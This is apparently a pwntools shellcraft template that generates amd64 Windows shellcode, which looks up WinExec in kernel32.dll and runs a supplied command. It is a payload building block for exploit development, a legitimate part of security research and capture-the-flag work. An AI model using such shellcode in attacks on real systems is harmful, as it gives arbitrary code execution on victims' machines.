<%
    from pwnlib.shellcraft import amd64, pretty
    from pwnlib.util.packing import _need_bytes
    from pwnlib.util.misc import align
%>
<%docstring>Execute a program using WinExec.

Args:
    cmd (str): The program to execute.
    cmd_show (int): nCmdShow parameter.
</%docstring>
<%page args="cmd, cmd_show = 0"/>
<%
cmd = _need_bytes(cmd)
stack_frame = 0x30 + align(8, len(cmd)+1)
stack_frame_align = 8 & ~stack_frame
%>

    ${amd64.windows.getprocaddress(b'WinExec', b'kernel32.dll', 'rsi')}
    ${amd64.pushstr(cmd)}
    mov rcx, rsp
    sub rsp, ${pretty(0x30 + stack_frame_align)}
    ${amd64.mov('rdx', cmd_show)}
    call rsi
% if stack_frame + stack_frame_align < 0x80:
    add rsp, ${pretty(stack_frame + stack_frame_align)}
% else:
    ${amd64.mov('rcx', stack_frame + stack_frame_align)}
    add rsp, rcx
% endif
